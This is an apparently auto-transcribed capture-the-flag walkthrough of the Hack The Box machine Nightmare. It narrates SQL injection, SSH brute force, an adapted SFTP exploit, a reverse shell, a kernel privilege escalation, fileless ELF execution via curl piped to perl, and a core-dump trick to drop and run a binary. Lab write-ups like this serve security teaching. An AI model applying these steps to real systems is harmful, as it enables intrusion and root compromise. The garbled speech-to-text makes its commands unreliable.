 what's going on YouTube this is IPSec and this video is going to be a bit odd this is the second video we did on nightmare and the first one is two and a half hours long so after I recorded that I was like you know what someone may not want to watch two and a half hours to see this box so I created a speedrun video of me just going through it very quickly without too much talking I kind of explained my mind set but don't go in depth so we could complete this box in like 20 minutes then when I was watching it over it I just didn't like it so I wasn't going to upload this at all until I saw the two unintended solutions for this box that I just decided you know what I'm gonna add to the end of the speedrun I had the unintended solutions and then we'll have another good video so the two unintended solutions the first one is really cool it comes from you Bix and it's a way to execute elf binaries in memory without touching discs so it's kind of like the reflective loading on Windows and then the second one is if you crash a process it creates a crash dump essentially that you can write to and execute so create the crash dump take advantage of the permissions the file gets created with to drop a binary there and then execute it so yeah let's just jump in running nmap we can see that we have two ports open Apache on 80 and SSH on two two two two patches on two four one eight on Ubuntu so this is most likely going to be xenial and SSH has a weird flag with not so recent version n and 32-bit so that is hinting at exporting SSH Apaches easy to exploits I'm going to go that first we can try registering a user and put a bunch of weird things in so that's testing cross-site scripting and then put a bunch of random characters in that we can do it on both fields logging in we can see a SQL error and this is just below the Select Ockman to upload this would show all the documents uploaded or notes taken so most likely this is in the username field since you got to select something from select star where username equals something so let's register user let's test so let's do a a home float and then that we can just put the password as a always make sure to copy the username to make logging in easy and I wish I'd stop clicking that little warning still have that SQL error so let's try registering something a little bit different register in well again and we don't have that SQL error anymore so we can log out and play with Union injection see and we can do select it's probably gonna be like note name and note description or something so we'll do Union select one to register again we see this is SQL injectable so this is going to be a second order SQL injection let us dump all the tables so we can do something like Union select table schema tape looks like that is capped on number of characters so what's on this to boot register repeater let's on your Ellen code this so it makes sense to us and table schema table name column name from information schema columns don't forget to comment and we have three different fields he'll here and the Union select only supports - so let's concatenate a delimiter and then we just need another field so please subscribe close off the concat send this in and let us login I actually only went to register again repeater is on Oh drop oh we're just trying to accept off well again and we need them to have dumped the database so we can just copy this all to a text file actually now we see what we wants this admin with user and password and this is the users table these are the two columns so let us login we're not calling in but do another sequel injection don't one bro repeater we can do username password don't need that third field and this is from this admin users create this account copy well again we have to kill this PHP so oh we already logged out so there we go that PHP session was logged in so it couldn't register account but when click logout that was fine so let's copy all this create a word list well grep for the delimiter we use which is colon on temp to use your past text we can pass this to Hydra now so Hydra - see user pass dot txt ssh 1010 1066 - - - to get an account try to log into this SH - P FTP user at 10:10 1066 at where you go failed its FTP so let's try SFTP on for it - capital P P changes flags when you get connected and with the root so if we just Google s f TP exploit get a full disclosure post copy this all exit them SFTP C set paste Weezie it right here mini r op pop RTI this is 32-bit based upon the manner so we have to convert this into 32-bit which means the very first thing is going to be remote system address then we have nops then we have the stack don't address and have to convert all 64-bit references to 32 bit so that SFTP seek 64 so any other 64 is there there's another one okay long long we don't want that we want that to be integer and let's see we want size T to be an unsigned int and we want size T to also be unsigned in and that was my phone I forgot to put that on mute my bad unsigned end okay let's see if this cop compiles oh we have to get compiled instructions I forget the flags so we go to another exploit that is similar and we have compiled instructions here does compile and I did realize I forgot one thing we have to make a port because this defaults to port 2 2 2 2 so let's see so B and forget port is equal to ask you to integer 2 2 2 to change this ok compile failed forgot that last time to when I did this the first time and ok and then let us chmod plus x sh poit ok we need to grab Michelle so and test monkey Michelle cheat sheet grab this use Python because we don't have write X to the server and we just want to replace all double quotes with backslash double quote that will do it and our IP address which is 1010 1430 use port 443 okay tempo copy I miss copy sage Boyd so dot slash Sh boy 1010 1066 FTP user and paste the code have net cut listen to password in unable to find stack so we forgot one thing to do in the exploit I think that is LX to just X you see okay got so we can do find that - / - 2004 GID binaries and - dev know we have you want / and want / so dots fine fine - boom - mm hey I did 200 nope oh let's see maybe it's oh well the binary want is here SOS that is not normally in the bin so not sure if I did that wrong right but we'll just move on let's NC 1010 1430 that binary and co BNP 80s LS already in use I think burps using it disabled that and C 1010 1438 II got it data to analyze look at the function comparing against one this looks like a loop going down we have comparing against - and we have - B so there is a argument there additionally all these look like bad characters so it's doing some type of bad character filter going down after the loop we do have a system call and tracing the system call up we have it comparing against this variable that is whoa right to the left here ready to screwed up let's see what was that right here so something sets it it was that - B if we go up here - P sets that and then just before that you have a check for a new line which is a bad character not in the bad character list so let us try exploiting it go to reverse shell use AB in SLS - P single quote and bash fin Sh I think is simile - Ben - what we'll just do Ben - Ben basketball my drawers permissions ID we are now decoder and we can go into test and touch files so we can do a you name - a grab the kernel version search it with probe ask and we'll put Ubuntu in the search this has it actually in the description so we can go to raw let's compile this do it on a box because GCC isn't on the box there so the kernel dot C set paste paste it in GCC - open base 64 pound so we can copy this getting the line search for fruit oh it didn't copy everything I thought it would copy everything go back to a shell them CD 64 that didn't work well run the shell again we're on the exploit again and we'll do Python to get a TTY place on SC import PT y PT so they did that right oh hi have single quotes twice them T dot be 64 I don't think I have write access where I'm at PWD I do have write access I think nope I did bin bash on my tty pythons SC 42 y PT y dot lon then Sh them T dot be 64 that looks better hey it let's just kill this Python see simple HTTP server on port 80 and that is to t be 64 curl 1010 1438 e / T dot B 64 - d dot b 64 and we even have to basics for encoded since we're curling it but oh well it's called pone sometimes it's hard to go fast actually 10 1014 30-pound will do - go first I don't know if this has been reset since I'd last it on the video so do - OH curl it chmod plus x own chmod plus x doesn't exist so pone does exist so that's why I didn't go into dot slash pound - turnover is not recognized looking at it pulls it from LSB release catting at C LSB release and we have that being changed so it's just Google Ubuntu xenial LSB lease and we'll grab an example file do it to please sub I think this needs a double quote we can call that n 10 14 30 please sub to please sub cat please sub that exist so let's modify the kernel and we'll do a speed release to please sub GCC again curl - oh that one three and then chmod plus x 3 run it if we got one modification so please sub is actually in home Dakota test please sub looking at that Etsy shouldn't be there so made three modifications so let's just fix that okay and the final time to copy this over hopefully twelve ten ten fourteen thirty pound to pound for alright failed because the set groups if we look we have a GID already set so let's go back to dub-dub-dub data or FTP user go there pound for and we a root and that is the box so hope you enjoyed the speedrun and maybe that convinces you to watch that two and a half hour video apologies for that sloppy cut after recording the video I saw two really cool ways to do the nightmare machine without having to do the SLS binary the very first one is my favorite it allows you to execute elf without touching disk I saw this on meu byxis stream last night that's mu b IX he does twitch dreams probably once or twice a week so i'm gonna do that one first and then go into one that was person on the hack the box forum about creating a crash dump which gets chmod into 777 so you can edit that file with the binary and then execute it I like the in memory elf more because it has more application on machines because most machines you have write access somewhere so creating that crash dump isn't really buying you anything except in this weird CTF issue doing this for a memory is just really cool in general because it bypasses the need to use like temp FS as such as dev s hm so the very first thing to do is Google in memory only elf execution and it should be the very first blog post I'll put it in the comments in the video it'll go below the timestamps and you can essentially read this whole thing but wanna take two things out of that this we're going to grab I think it's that purl command nope right here we're gonna grab this Pearl command and what this is gonna do is give you a bunch of lines that look like this so let us go here and we're going to create a file elf - prep SH and I've already created this all I did was paste the command I got replaced dot slash F by neri with the very first argument so when you run this on a file let's see do I have else we have ponen here so we'll do bash elf prep bone and all that's going to do is print a bunch of hex so we can load that into memory the second thing it's going to involve some typing I know people are gonna want me to post it to github but I mean you'll learn a lot more if you just type it yourself but go all the way down here and you have the other pieces of a script he probably has it somewhere else but I saw in this ASCII stream and you can try to copy and paste out of this it didn't work too well for me but you can see the codes here I created both those files we have elf load PL head and this is just going to set it up so we can execute something out of memory then we have L float PL tail and this is just going to actually execute it so we're executing and then this is going to be what you see in the PS output please subscribe so in order to make this work you have to do the elf prep pone and we'll put this to elf blowed PL body and they can cat elf load PL head elf load PL body and elf load PL tail to elf load PL this isn't going to work right away because nightmare did get reverted since I did the video and that whole kernel check thing isn't going to be there additionally that did requires getting to nightmare privileges to begin with to be able to place that LSB release file of as annual machine somewhere else so we're going to redo the whole kernel exploit so lets them parent see and we can go over here this is just the exploit code I have pulled earlier in the video let's paste this in forgot to do set paste and we have to make this flag on all our kernel because we now can't just create our own LSB release file so what we're going to do is let's see find what flags which we'll call it xenial and just change that to Bladerunner so right here we have let's see needle way get distro that's reading LSB release that's a tab and execute here we go going to take that's weird okay I'll go with that one two three four take those four lines and we're gonna say if string comparison is equal to lead Runner and it's a four eight colonel I believe and going up here let's just search zhenya now we can take this tunnel the four eight 0.58 this is the kind of we're on and we're gonna replace zaniel with Blade Runner because that's where it's been renamed to so we can copy pen or compile pensee and app own and redo or elf thing so elf prep let's see - elf prep dot sh PO into the body we can get this we look at L float PL we have that head file we have it loading the binary into memory and then executing it so we can load the simple web server Python H to be simple HTTP server 80 n CL v NP nope do the show up here and then the ssh boyd thing from earlier the password at where you go and we get a show and this is the user that doesn't have write access anywhere so we can just do curl oh I forgot something we'll have to edit the C code a little more so 1010 1430 slash what we call it elf blowed PL okay that works cat girl 1010 1430 I'll float PL and just pipe that over into Perl and we were nightmare Oh root and then it exited right away so let's see how can we get that to stay around and I'm actually not sure how to do it that way maybe because the trick is we have to use curl pipe it to purl and then get that TTY to say there may be something we can do within L flowed to do that I'm not sure maybe we if we just hold on whoops and yeah I'm not sure we're going to edit the exploit again so then parent C and we're going to go to the exploit and I forget what it is get group maybe see it's calling bash so let's just search for bash and here we have the exact shell and I tried playing around with this to do like a Python shell but it's in a very odd network state so if we did like /s pin ifconfig and then ENS 33 let's see GCC Python so we do if config here we see it is e NS 33 and if we do the curl elf load BL GCC bash elf prep then next one was cat everything I should make that into a single script cold 1010 1430 elf load PL Perl device not found within a odd sandbox that I couldn't get network connection working from so if we edit this exploit again DNS 33 change that to loopback C compile prep cat Python girl I can just copy up from up here look at the receive and transmit packets everything is 0 if I just do if config ll let me see a bunch of stuff so it's in an odd sandbox so even if I just listened on loopback port 8000 it doesn't make the connection to me so I did what mu bik's did and that is just write a file to disk that file being the ssh authorized key file so let's cat root we can just use SSH key gen we want to use a file to save we'll do root htb boxes nightmare please sub okay so if we cat please sub dot public we can grab this SSH key and then edit the exploit for one final time so now we're looking for s been if config this exists in a function called setting up sandbox a set up sandbox exec shell so we're gonna get rid of this code and do care ki is equal to or ssh key we don't have to have that but all well leave that there that we can do file F P is equal to F open-roof ssh authorized keys open that for writing and I think there's gonna delete the whole file every time so we could do a pend but let's just be noisy and erased a file with it exists and then F print f FP the string new line or key and that should be it we should close the file F closed FB so now we're just writing or SSH key to the desk and if it is if it does right then we'll be able to just SSH in sitting a pilot prep it combined head body and tail and then start a web server so we can do curl 1010 1430 lfloat' Bo pearl and it says it got root and let's see we close out of here SSH - I we have to chmod it chmod 600 s H - I please sub have two files please up I think that's the correct one keep that bigger - P - 2 - 2 and IP address of nightmare which is 1010 1066 and we're route so we're going to erase that key and then do it again so our MDOT SSH authorized keys and we can just touch it authorized keys so if we look at that file completely empty so the next way to do this box and look we're still FTP user we can't get into root is if we go to form dot pack the box org not you I don't know why I said work for masterbox EU and go to search search for nightmare we got a very good write up by 0x e a 3-1 and essentially when a process creates a chord um it's going to be chmod into 777 and there's a whole description below exactly why that is if you want you can read it but we're just going to do it so says sleep 60 and then you do p-trap on the FTP user Oh - she'll pee grip - you FTP user - L and then we can kill it with one five nine oh because that tells it to create a core dump 1 5 9 l 1681 was it kill go 11 kill - 11 1 6 8 1 can't read so now it should have a crash dump and crash we see this lock file is CH 5 - 7 7 7 so we can write anything we want so please sub - we actually write to the bin sleep crash file as well so if we catwalk now we can write to it so the step is to curl 1010 1430 we'll just do pound - Oh dot block Python copy this if we do LSD now that lock is pretty big and it's an elf object so let's SSH again we can't it's going to ask us for a password and now we can just execute dot lock and now only SSH it wets us in so those are the two ways to do it through not fooling around with SLS I hope you guys enjoyed this and I'll see you next week